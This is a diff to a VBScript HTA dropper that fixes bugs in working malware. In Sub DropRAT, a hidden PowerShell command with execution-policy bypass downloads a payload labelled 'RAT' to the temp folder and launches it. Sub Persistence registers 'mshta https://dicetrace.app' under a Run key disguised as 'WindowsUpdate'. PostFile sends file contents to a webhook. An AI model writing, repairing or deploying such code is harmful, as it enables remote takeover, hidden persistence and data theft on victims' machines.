@@ -149,24 +149,20 @@ Sub DropRAT()
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
-    Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)
+    Call PostEmbed("ðŸ“¦ RAT Download", "Fetching payload...", 3447003)
 
-    ' Use PowerShell to download synchronously (doesn't hang like bitsadmin)
-    sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    ' Added -UseBasicParsing to prevent IE engine hang, and -Exec Bypass for execution policy
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -UseBasicParsing -Uri '" & dl & "' -OutFile '" & temp & "'""", 0, True
     
-    ' Run if downloaded
     If fso.FileExists(temp) Then
-        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
+        Call PostEmbed("ðŸš€ RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
         
-        ' Set working directory to avoid PyInstaller crash
         sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
-        
-        ' Launch via cmd start to detach from HTA
         sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
         
-        Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
+        Call PostEmbed("âœ… RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
+        Call PostEmbed("âŒ› RAT Error", "Download failed.", 16711680)
     End If
 End Sub
 
@@ -182,7 +178,8 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta dicetrace.app"
+    ' Added https:// to the payload
+    Dim payload : payload = "mshta https://dicetrace.app"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -265,7 +262,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type: multipart/form-data; boundary=" & b
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
